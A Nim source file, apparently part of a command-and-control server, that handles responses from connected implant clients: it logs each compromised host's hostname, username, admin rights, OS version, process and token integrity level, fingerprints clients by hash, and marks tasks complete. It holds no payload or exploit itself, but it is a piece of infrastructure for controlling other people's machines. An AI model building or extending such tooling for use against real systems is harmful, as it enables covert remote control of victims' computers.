import std/[
  asyncdispatch, 
  asyncfutures, 
  strutils, 
  strformat, 
  json, 
  md5
]

import pixie

import types, logging, communication, handleResponse, events

proc generateClientHash(c: C2Client): string =
  getMD5(
    fmt"{c.ipAddress}{c.hostname}{c.username}{c.osType}{$c.windowsVersionInfo}"
  )

proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} = 
  let server = client.server

  if not (client[] in server.clients):
    server.clients.add client[]

  let error = response["error"].getStr() 
  let taskId = response["taskId"].getInt(-1) 

  if taskId <= -1:
    await client[].askToIdentify()
    return

  let task = server.tasks[taskId]
  if error != "":
    errorLog $client[] & ": " & error
  else: 
    case response["task"].getStr():
    of "identify":
      client.hostname = response["data"]["hostname"].getStr("")
      client.username = response["data"]["username"].getStr("")
      client.isAdmin = response["data"]["isAdmin"].getBool(false)

      case response["data"]["osType"].getStr("unknown"):
      of "unknown":
        client.osType = UnknownOS
      of "windows":
        client.osType = WindowsOS
      of "linux":
        client.osType = LinuxOS
      client.windowsVersionInfo = WindowsVersionInfo(
        majorVersion: response["data"]["windowsOsVersionInfo"]["majorVersion"].getInt(),
        minorVersion: response["data"]["windowsOsVersionInfo"]["minorVersion"].getInt(),
        buildNumber: response["data"]["windowsOsVersionInfo"]["buildNumber"].getInt()
      )
      client.linuxVersionInfo = LinuxVersionInfo(
        kernelVersion: response["data"]["linuxOsVersionInfo"]["kernelVersion"].getStr(),
      )
      client.hash = client[].generateClientHash()
      client.isAdmin = response["data"]["isAdmin"].getBool(false)
      client.pid = response["data"]["pid"].getInt(0)
      client.pname = response["data"]["pname"].getStr("")
      client.isAdmin = response["data"]["isAdmin"].getBool()
      client.tokenInformation = TokenInformation(
        integrityLevel: TokenIntegrityLevel(
          sid: response["data"]["ownIntegrity"].getStr("")
        )
      )
      if not client.loaded:
        client.loaded = true
        onClientConnected(client[])
        cConnected client[]
    of "output":
      infoLog $client[] & " completed task " & task.action
      handleResponse(client[], false, response)
  
  task.mark_as_completed(response)
  onClientTaskCompleted(client[], task)